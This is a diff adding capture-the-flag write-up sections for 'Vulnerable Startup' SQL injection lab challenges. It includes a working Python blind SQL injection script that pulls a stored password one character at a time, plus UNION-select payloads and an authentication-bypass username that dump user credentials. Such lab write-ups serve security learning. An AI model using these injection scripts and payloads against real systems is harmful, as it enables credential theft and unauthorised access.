@@ -185,6 +185,117 @@ This way concats all the passwords
 
 <figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>
 
+## Vulnerable Startup: Broken Authentication 3 (Blind Injection)
+
+
+
+#### challenge3-exploit.py
+
+```
+#!/usr/bin/python3
+import sys
+import requests
+import string
+
+
+def send_p(url, query):
+    payload = {"username": query, "password": "admin"}
+    try:
+        r = requests.post(url, data=payload, timeout=3)
+    except requests.exceptions.ConnectTimeout:
+        print("[!] ConnectionTimeout: Try to adjust the timeout time")
+        sys.exit(1)
+    return r.text
+
+
+def main(addr):
+    url = f"http://{addr}/challenge3/login"
+    flag = ""
+    password_len = 38
+    # Not the most efficient way of doing it...
+    for i in range(1, password_len):
+        for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}":
+            # Convert char to hex and remove "0x"
+            h = hex(ord(c))[2:]
+            query = "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1)," \
+                f"{i},1)=CAST(X'{h}' AS TEXT)--"
+
+            resp = send_p(url, query)
+            if not "Invalid" in resp:
+                flag += c
+                print(flag)
+    print(f"[+] FLAG: {flag}")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) == 1:
+        print(f"Usage: {sys.argv[0]} MACHINE_IP:PORT")
+        sys.exit(0)
+    main(sys.argv[1])
+
+```
+
+
+
+**Kali**
+
+```
+python challenge3-exploit.py $KALI:5000
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+## Vulnerable Startup: Vulnerable Notes
+
+Create user
+
+```
+Username: '  union select 1,group_concat(password) from users'
+Password: blah
+```
+
+
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+
+
+## Vulnerable Startup: Change Password
+
+**Signup**
+
+```
+Username: admin'-- -
+```
+
+## Vulnerable Startup: Book Title
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+```
+') union select 1,group_concat(username),group_concat(password),4 from users-- -
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+## Vulnerable Startup: Book Title 2
+
+```
+' union select '-1''union select group_concat(username),group_concat(password),3,4 from users-- -
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+
+
+
+
 
 
 
